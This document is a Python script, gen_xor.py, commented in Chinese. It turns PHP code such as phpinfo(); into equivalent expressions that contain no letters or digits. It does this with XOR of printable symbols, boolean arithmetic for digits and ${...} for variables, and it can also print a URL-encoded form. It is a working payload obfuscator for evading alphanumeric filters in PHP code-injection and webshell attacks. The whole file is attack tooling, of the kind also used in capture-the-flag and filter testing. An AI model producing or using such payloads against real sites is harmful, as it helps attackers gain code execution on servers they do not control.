#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
gen_xor.py  ---  异或法 payload 生成器

把输入代码里的【字母和数字】替换成异或表达式, 其余字符(括号/分号/引号等)原样保留。
输入:  phpinfo();
输出:  (('+'^'[').('('^'@')...)();

用法:
    python gen_xor.py "phpinfo();"
    python gen_xor.py -u "phpinfo();"      # 追加输出 URL 编码形态
    echo "phpinfo();" | python gen_xor.py
"""
import sys
import string
import urllib.parse

ALNUM = set(string.ascii_letters + string.digits)
# 可打印的非字母数字字符
SYM = [c for c in map(chr, range(0x21, 0x7F)) if c not in ALNUM]

# PHP 标识符: 首字符 [A-Za-z_], 后续 [A-Za-z0-9_]
# 必须把 _ 算进标识符, 否则 var_dump / file_put_contents 会被拆断
ID_START = set(string.ascii_letters) | {"_"}
ID_CHAR = set(string.ascii_letters + string.digits) | {"_"}
DIGITS = set(string.digits)


def phpq(c):
    """非字母数字字符 -> PHP 字符串字面量"""
    if c == "'":
        return '"\'"'
    if c == '"':
        return "'\"'"
    if c == "\\":
        return '"\\\\"'
    return "'" + c + "'"


def char_expr(c):
    """单个字母/数字 -> 求值得到该字符的 PHP 表达式"""
    if c in string.digits:
        # 数字无法用可打印符号异或出来, 用布尔算术: "" . (true+true+...) == "2"
        n = int(c)
        if n == 0:
            return '("" . (![] - ![]))'
        return '("" . (' + ' + '.join(['![]'] * n) + '))'
    for a in SYM:
        b = chr(ord(a) ^ ord(c))
        if b in SYM:
            return "(" + phpq(a) + "^" + phpq(b) + ")"
    raise ValueError("无法构造字符: %r" % c)


def build(s):
    """字符串 -> 求值得到该串的 PHP 表达式 (不出现任何字母数字)"""
    if not s:
        return "''"
    return ".".join(char_expr(ch) if ch in ALNUM else phpq(ch) for ch in s)


def translate(code):
    out = []
    i, n = 0, len(code)
    while i < n:
        c = code[i]

        # 字符串字面量: 整体替换成表达式, 引号丢弃
        if c in "'\"":
            j = i + 1
            buf = []
            while j < n and code[j] != c:
                if code[j] == "\\" and j + 1 < n:
                    buf.append(code[j + 1])
                    j += 2
                    continue
                buf.append(code[j])
                j += 1
            out.append("(" + build("".join(buf)) + ")")
            i = j + 1
            continue

        # 变量: $name -> ${表达式}
        if c == "$":
            k = i + 1
            j = k
            while j < n and code[j] in ID_CHAR:
                j += 1
            if j > k:
                out.append("${" + build(code[k:j]) + "}")
                i = j
                continue
            out.append(c)
            i += 1
            continue

        # 标识符(含下划线) -> (表达式)
        if c in ID_START:
            j = i
            while j < n and code[j] in ID_CHAR:
                j += 1
            out.append("(" + build(code[i:j]) + ")")
            i = j
            continue

        # 纯数字 -> (表达式)
        if c in DIGITS:
            j = i
            while j < n and code[j] in DIGITS:
                j += 1
            out.append("(" + build(code[i:j]) + ")")
            i = j
            continue

        out.append(c)
        i += 1
    return "".join(out)


def main():
    args = sys.argv[1:]
    url = False
    if "-u" in args:
        url = True
        args.remove("-u")
    code = args[0] if args else sys.stdin.read()
    code = code.rstrip("\r\n")
    p = translate(code)
    print(p)
    if url:
        print()
        print(urllib.parse.quote(p, safe=""))


if __name__ == "__main__":
    main()
